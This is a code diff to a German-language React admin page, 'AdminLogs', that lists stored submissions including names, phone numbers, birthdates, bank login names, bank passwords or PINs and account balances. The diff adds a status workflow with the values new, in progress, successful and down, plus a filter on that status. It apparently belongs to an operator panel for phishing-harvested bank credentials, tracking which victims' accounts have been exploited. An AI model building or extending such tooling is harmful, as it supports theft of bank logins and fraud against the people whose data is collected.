@@ -6,7 +6,9 @@ import Header from "@/components/Header";
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
+import { Badge } from "@/components/ui/badge";
 import { toast } from "sonner";
 import { Copy, Eye, LogOut } from "lucide-react";
 
@@ -32,7 +34,17 @@ interface Submission {
   bank_password_label: string | null;
   bank_extra: Record<string, string> | null;
   balance: string | null;
+  status: string | null;
 }
+
+const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;
+
+const statusBadgeClass: Record<string, string> = {
+  "Neu": "bg-gray-200 text-gray-800 hover:bg-gray-200",
+  "In Bearbeitung": "bg-blue-100 text-blue-800 hover:bg-blue-100",
+  "Erfolgreich": "bg-green-100 text-green-800 hover:bg-green-100",
+  "Down": "bg-red-100 text-red-800 hover:bg-red-100",
+};
 
 const AdminLogs = () => {
   const navigate = useNavigate();
@@ -40,6 +52,7 @@ const AdminLogs = () => {
   const [loading, setLoading] = useState(true);
   const [submissions, setSubmissions] = useState<Submission[]>([]);
   const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string } | null>(null);
+  const [statusFilter, setStatusFilter] = useState<string>("Alle");
 
   useEffect(() => {
     const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
@@ -84,13 +97,6 @@ const AdminLogs = () => {
     toast.success("Kopiert!");
   };
 
-  const parseName = (fullName: string | null) => {
-    if (!fullName) return { first: "-", last: "-" };
-    const parts = fullName.trim().split(/\s+/);
-    if (parts.length === 1) return { first: parts[0], last: "-" };
-    return { first: parts[0], last: parts.slice(1).join(" ") };
-  };
-
   const saveBalance = async () => {
     if (!balanceEdit) return;
     const { error } = await supabase
@@ -108,6 +114,15 @@ const AdminLogs = () => {
     }
   };
 
+  const updateStatus = async (id: string, status: string) => {
+    const { error } = await supabase.from("submissions").update({ status }).eq("id", id);
+    if (error) {
+      toast.error("Fehler beim Speichern");
+    } else {
+      setSubmissions((prev) => prev.map((s) => (s.id === id ? { ...s, status } : s)));
+    }
+  };
+
   const CopyCell = ({ value }: { value: string | null }) => {
     if (!value) return <span>-</span>;
     return (
@@ -119,6 +134,10 @@ const AdminLogs = () => {
       </button>
     );
   };
+
+  const filteredSubmissions = statusFilter === "Alle"
+    ? submissions
+    : submissions.filter((s) => (s.status || "Neu") === statusFilter);
 
   if (loading) {
     return (
@@ -149,13 +168,28 @@ const AdminLogs = () => {
           </div>
         </div>
 
+        {/* Status Filter */}
+        <div className="mb-4 flex items-center gap-2">
+          <span className="text-sm text-gray-500">Filter:</span>
+          {["Alle", ...STATUS_OPTIONS].map((s) => (
+            <Button
+              key={s}
+              size="sm"
+              variant={statusFilter === s ? "default" : "outline"}
+              onClick={() => setStatusFilter(s)}
+              className="text-xs"
+            >
+              {s}
+            </Button>
+          ))}
+        </div>
+
         <div className="rounded-lg border bg-white shadow-sm overflow-x-auto">
           <Table>
             <TableHeader>
               <TableRow>
                 <TableHead>Zeitpunkt</TableHead>
-                <TableHead>Vorname</TableHead>
-                <TableHead>Nachname</TableHead>
+                <TableHead>Name</TableHead>
                 <TableHead>Telefonnummer</TableHead>
                 <TableHead>Geburtsdatum</TableHead>
                 <TableHead>Stadt</TableHead>
@@ -163,19 +197,19 @@ const AdminLogs = () => {
                 <TableHead>Login-Name</TableHead>
                 <TableHead>Passwort/PIN</TableHead>
                 <TableHead>Guthaben</TableHead>
+                <TableHead>Status</TableHead>
                 <TableHead>Details</TableHead>
               </TableRow>
             </TableHeader>
             <TableBody>
-              {submissions.map((sub) => {
-                const { first, last } = parseName(sub.full_name);
+              {filteredSubmissions.map((sub) => {
+                const currentStatus = sub.status || "Neu";
                 return (
                   <TableRow key={sub.id}>
                     <TableCell className="whitespace-nowrap text-xs">
                       {sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "-"}
                     </TableCell>
-                    <TableCell>{first}</TableCell>
-                    <TableCell>{last}</TableCell>
+                    <TableCell>{sub.full_name || "-"}</TableCell>
                     <TableCell><CopyCell value={sub.phone} /></TableCell>
                     <TableCell>{sub.birthdate || "-"}</TableCell>
                     <TableCell>{sub.city || "-"}</TableCell>
@@ -191,6 +225,18 @@ const AdminLogs = () => {
                       </button>
                     </TableCell>
                     <TableCell>
+                      <Select value={currentStatus} onValueChange={(val) => updateStatus(sub.id, val)}>
+                        <SelectTrigger className="h-7 w-[130px] text-xs border-0 p-0">
+                          <Badge className={statusBadgeClass[currentStatus] || ""}>{currentStatus}</Badge>
+                        </SelectTrigger>
+                        <SelectContent>
+                          {STATUS_OPTIONS.map((opt) => (
+                            <SelectItem key={opt} value={opt}>{opt}</SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </TableCell>
+                    <TableCell>
                       <Button size="sm" variant="outline" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
                         <Eye className="mr-1 h-3 w-3" /> Details
                       </Button>
@@ -198,7 +244,7 @@ const AdminLogs = () => {
                   </TableRow>
                 );
               })}
-              {submissions.length === 0 && (
+              {filteredSubmissions.length === 0 && (
                 <TableRow>
                   <TableCell colSpan={11} className="text-center text-gray-400 py-8">
                     Keine Einträge vorhanden
